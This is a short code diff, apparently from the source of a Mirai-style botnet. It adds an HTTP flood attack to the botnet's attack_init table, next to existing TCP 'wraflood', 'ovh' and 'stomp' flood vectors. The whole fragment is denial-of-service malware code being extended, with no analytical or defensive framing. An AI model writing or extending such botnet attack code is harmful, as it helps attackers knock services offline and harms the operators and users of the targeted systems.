@@ -38,6 +38,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood);
     add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_ovh);
     add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_stomp);
+    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_http);
 
     return TRUE;
 }
